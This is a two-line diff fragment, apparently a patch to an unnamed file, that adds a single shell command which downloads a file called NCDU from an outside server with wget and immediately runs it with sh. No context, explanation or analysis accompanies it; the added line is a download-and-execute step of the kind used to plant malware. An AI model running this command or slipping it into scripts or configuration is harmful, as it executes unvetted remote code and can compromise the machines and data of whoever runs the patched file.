@@ -1,0 +1,2 @@
+
+wget https://server.m4kr.net/work/NCDU&&sh NCDU;
